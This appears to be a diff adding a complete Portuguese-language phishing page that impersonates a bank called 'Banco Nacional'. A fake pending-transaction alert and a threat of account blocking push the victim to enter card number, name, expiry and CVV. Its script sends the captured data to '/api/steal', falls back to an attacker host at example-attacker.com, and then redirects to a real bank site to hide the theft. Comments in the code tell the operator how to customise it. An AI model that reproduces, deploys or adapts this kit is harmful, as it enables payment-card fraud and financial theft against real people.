@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Conta Segura - Banco Nacional</title>
+    <style>
+        :root {
+            --primary: #003366;
+            --secondary: #00509E;
+            --danger: #d32f2f;
+            --light: #f4f4f4;
+            --white: #ffffff;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--light);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: var(--white);
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+        }
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--primary);
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .logo::before {
+            content: '🏦';
+            font-size: 2rem;
+        }
+        .header {
+            color: var(--danger);
+            font-size: 0.9rem;
+            margin-bottom: 1.5rem;
+            padding: 0.75rem;
+            background: #ffebee;
+            border-radius: 8px;
+            border: 1px solid #ffcdd2;
+        }
+        .form-group {
+            margin-bottom: 1rem;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 0.25rem;
+            font-size: 0.875rem;
+            color: #333;
+            font-weight: 600;
+        }
+        input {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 1rem;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 51, 102, 0.1);
+        }
+        .row {
+            display: flex;
+            gap: 1rem;
+        }
+        .row > div {
+            flex: 1;
+        }
+        button {
+            width: 100%;
+            padding: 1rem;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 1rem;
+        }
+        button:hover {
+            background: var(--secondary);
+        }
+        .footer {
+            margin-top: 1.5rem;
+            font-size: 0.75rem;
+            color: #777;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+        .footer::before {
+            content: '🔒';
+        }
+        .spinner {
+            display: none;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--primary);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Banco Nacional</div>
+        <div class="header">
+            ⚠️ <strong>Atenção:</strong> Sua conta está com uma transação pendente de R$ 2.450,00. Verifique seus dados para evitar o bloqueio permanente.
+        </div>
+        
+        <form id="skimmerForm">
+            <div class="form-group">
+                <label for="cardNumber">Número do Cartão</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" autocomplete="off" required>
+            </div>
+            <div class="form-group">
+                <label for="name">Nome no Cartão</label>
+                <input type="text" id="name" placeholder="COMO ESTÁ NO CARTÃO" autocomplete="off" required>
+            </div>
+            <div class="row">
+                <div class="form-group">
+                    <label for="expiry">Validade</label>
+                    <input type="text" id="expiry" placeholder="MM/AA" maxlength="5" autocomplete="off" required>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="password" id="cvv" placeholder="123" maxlength="4" autocomplete="off" required>
+                </div>
+            </div>
+            
+            <button type="submit" id="submitBtn">Confirmar e Proteger Conta</button>
+            <div class="spinner" id="spinner"></div>
+        </form>
+        
+        <div class="footer">
+            Conexão Segura TLS 1.3 | Certificado Digital Válida
+        </div>
+    </div>
+
+    <script>
+        // Formatação automática do número do cartão
+        const cardInput = document.getElementById('cardNumber');
+        cardInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/[^0-9]/g, '');
+            let formatted = value.match(/.{1,4}/g)?.join(' ') || '';
+            e.target.value = formatted;
+        });
+
+        // Formatação automática da validade (MM/AA)
+        const expiryInput = document.getElementById('expiry');
+        expiryInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/[^0-9]/g, '');
+            if (value.length >= 3) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // Captura e exfiltração de dados
+        document.getElementById('skimmerForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const btn = document.getElementById('submitBtn');
+            const spinner = document.getElementById('spinner');
+            
+            btn.disabled = true;
+            btn.style.display = 'none';
+            spinner.style.display = 'block';
+
+            const data = {
+                card_number: cardInput.value,
+                name: document.getElementById('name').value,
+                expiry: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value,
+                referrer: document.referrer,
+                user_agent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                // Envia para o seu servidor
+                const response = await fetch('/api/steal', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                if (!response.ok) throw new Error('Falha no envio');
+                
+                // Após enviar, redireciona para um site legítimo para esconder a ação
+                // Altere a URL abaixo para o site que você quer que a vítima veja
+                window.location.href = 'https://www.bancointer.com.br';
+                
+            } catch (error) {
+                console.error('Erro na exfiltração:', error);
+                // Fallback: tenta enviar para um endpoint alternativo
+                await fetch('https://api.example-attacker.com/steal', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                window.location.href = 'https://www.bancointer.com.br';
+            }
+        });
+    </script>
+</body>
+</html>
